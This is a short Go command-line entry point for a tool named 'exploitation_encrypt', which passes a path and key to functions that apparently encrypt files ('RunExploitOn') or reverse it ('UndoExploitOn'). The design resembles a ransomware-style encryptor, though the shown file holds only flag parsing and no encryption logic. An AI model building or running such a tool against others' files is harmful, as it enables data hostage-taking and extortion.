package main

import (
	"exploitation_encrypt/exploitation"
	"flag"
	"log"
	"os"
)

func main() {

	pathPtr := flag.String("path", "", "path to exploit")
	keyPtr := flag.String("key", "", "key path for encrypting")
	decryptFlag := flag.Bool("decrypt", false, "flag for decrypting,if not given will encrypt by default")

	flag.Parse()

	if *pathPtr == "" || *keyPtr == "" {
		log.Println("[*] Usage -path -key -encrypt[false]")
		os.Exit(1)
	}

	if *decryptFlag {
		exploitation.UndoExploitOn(*pathPtr, *keyPtr)
		os.Exit(0)

	}
	exploitation.RunExploitOn(*pathPtr, *keyPtr)
}
